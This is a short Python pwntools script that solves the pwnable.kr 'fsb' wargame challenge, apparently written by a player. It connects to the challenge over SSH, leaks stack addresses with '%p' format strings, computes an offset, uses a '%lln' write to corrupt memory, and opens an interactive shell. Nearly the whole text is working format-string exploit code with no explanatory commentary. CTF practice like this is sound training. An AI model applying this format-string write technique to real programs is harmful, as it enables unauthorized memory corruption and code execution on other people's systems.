from pwn import *

con = ssh("fsb", "pwnable.kr", 2222, "guest")
sh = con.process("/home/fsb/fsb")

payload1 = "%14$p.%18$p"
payload2 = "%{0}$p"
payload3 = "%{0}$lln"

sh.recvuntil("Give me some format strings(1)")
sh.sendline(payload1)
fsb_esp_0x50, main_ebp = sh.recvlines(2)[1].split(".")
offset = (int(main_ebp, 16) - int(fsb_esp_0x50, 16) - 0x44 + 0x50) / 4
sh.recvuntil("Give me some format strings(2)")
sh.sendline(payload2.format(offset))
sh.recvuntil("Give me some format strings(3)")
sh.sendline(payload3.format(offset))
sh.recvuntil("Give me some format strings(4)")
sh.sendline("\x90")

sh.sendline("0")
sh.interactive()

# Have you ever saw an example of utilizing [n] format character?? :(
